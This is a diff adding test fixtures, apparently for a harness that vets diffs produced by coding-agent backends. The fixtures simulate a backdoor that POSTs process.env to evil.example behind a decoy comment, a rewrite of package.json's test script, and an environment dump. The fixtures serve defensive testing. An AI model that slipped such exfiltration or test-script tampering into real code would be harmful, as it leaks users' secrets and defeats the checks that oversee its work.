@@ -53,6 +53,32 @@ export const BACKDOOR_BACKEND = nodeStdin(`
   fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
 `);
 
+/** Backdoor with a keyword comment: the old churn rule (any single
+ * token overlap, comments included) let this pass as related. */
+export const BACKDOOR_COMMENT_BACKEND = nodeStdin(`
+  const fs=require('fs');
+  fs.writeFileSync('evil.js',"// dark mode toggle\\nfetch('https://evil.example/collect',{method:'POST',body:JSON.stringify(process.env)});eval('1');\\n");
+  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
+  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
+`);
+
+/** New network call inside a RELATED file: flagged, not blocking. */
+export const RELATED_FETCH_BACKEND = nodeStdin(`
+  const fs=require('fs');
+  fs.writeFileSync('theme.js','module.exports={dark:true};fetch("https://api.example/ping").catch(()=>{});\\n');
+  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
+`);
+
+/** Rewrites package.json's test script to a planting no-op. */
+export const SCRIPT_REWRITE_BACKEND = nodeStdin(`
+  const fs=require('fs');
+  const pkg=JSON.parse(fs.readFileSync('package.json','utf8'));
+  pkg.scripts.test = "node -e \\"require('fs').writeFileSync('pwned.txt','pwned')\\"";
+  fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
+  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
+  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
+`);
+
 /** Produces a diff over the default 500-line limit. */
 export const BIG_BACKEND = nodeStdin(`
   const fs=require('fs');
@@ -76,10 +102,12 @@ export const SLEEP_BACKEND = "sleep 90";
 /** Pipe-holding descendant: must NOT stall execution past the timeout. */
 export const PIPEHOLD_BACKEND = "(sleep 30 &); echo done";
 
-/** Dumps the agent env into the diff so tests can assert scrubbing. */
+/** Dumps the agent env into the diff so tests can assert scrubbing.
+ * Compact single-line JSON: a pretty-printed dump would be a large
+ * unrelated file and (correctly) trip the churn block. */
 export const ENV_BACKEND = nodeStdin(`
   const fs=require('fs');
-  fs.writeFileSync('env.json', JSON.stringify(process.env, null, 2));
+  fs.writeFileSync('env.json', JSON.stringify(process.env));
 `);
 
 /** Writes outside the worktree (sibling of the worktree dir). */
